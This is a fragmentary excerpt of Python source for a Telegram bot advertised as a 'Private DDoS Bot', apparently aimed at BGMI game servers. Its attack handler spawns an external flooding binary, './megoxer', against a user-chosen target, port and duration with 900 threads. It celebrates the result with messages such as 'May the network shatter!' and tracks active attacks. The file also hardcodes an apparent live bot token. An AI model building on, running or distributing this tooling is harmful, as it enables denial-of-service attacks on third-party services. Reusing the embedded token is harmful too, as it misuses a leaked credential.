...
OWNER_ID = "945650098"
bot = telebot.TeleBot('7741936655:AAER4FUjSM073WUjKyDKD7Uvj0N7r8x8ZQw')
...
def start_command(message):
    welcome_message = """
    🌟 Welcome to the **Private DDoS Bot**! 🌟
...
def handle_bgmi(message):
    ...
    try:
        subprocess.Popen(
            ["./megoxer", target, str(port), str(duration), "900"],
    ...
    # Send initial attack message with full duration shown
...
🔥 **The wrath is unleashed. May the network shatter!** 🔥
    ...
    save_active_attacks()
    # Start asynchronous countdown using asyncio
